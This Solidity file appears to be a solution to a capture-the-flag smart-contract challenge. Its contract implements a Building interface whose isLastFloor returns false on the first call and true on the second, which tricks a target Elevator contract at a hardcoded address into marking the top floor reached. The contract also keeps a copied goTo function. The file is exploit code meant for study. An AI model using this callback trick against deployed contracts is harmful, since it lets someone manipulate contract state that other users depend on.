// SPDX-License-Identifier: MIT
pragma solidity ^0.6.0;
import './Elevator.sol';



contract StrangeBuilding is Building {
  bool public top;
  uint public floor;
  Elevator e = Elevator(address(0x329D7658cCBC225FE0E42f33e3b854aF1598bE77));
  uint count;

  constructor() public{
      count = 0;
  }

  function isLastFloor(uint _floor) external override returns (bool){
      count += 1;
      bool islast = count == 2;
      return islast;
  }

  function fireKey() public {
      e.goTo(42);
  }


  function goTo(uint _floor) public {
    Building building = Building(msg.sender);

    if (! building.isLastFloor(_floor)) {
      floor = _floor;
      top = building.isLastFloor(floor);
    }
  }
}